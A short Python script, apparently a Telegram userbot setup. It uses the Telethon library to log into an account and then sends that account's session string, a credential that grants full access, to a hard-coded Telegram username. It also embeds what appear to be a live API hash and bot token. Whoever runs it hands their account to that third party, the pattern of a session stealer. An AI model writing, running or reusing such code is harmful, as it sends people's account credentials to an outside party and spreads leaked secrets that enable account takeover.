from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
api_id = 19135260
api_hash = "1e953c707775350bac7f04ffef0ce8dd"
#string = "test"

bot_token = "5819951196:AAFQ1Az2ZE1WGkf_RRUrfvKcVQMdYRsSfFo"
with TelegramClient(StringSession(), api_id, api_hash) as client:
    #print(client.session.save())
    client.send_message("@abdivasiyev2008", client.session.save())

botClient = TelegramClient('@abdivasiyev2008', api_id, api_hash).start(bot_token=bot_token)






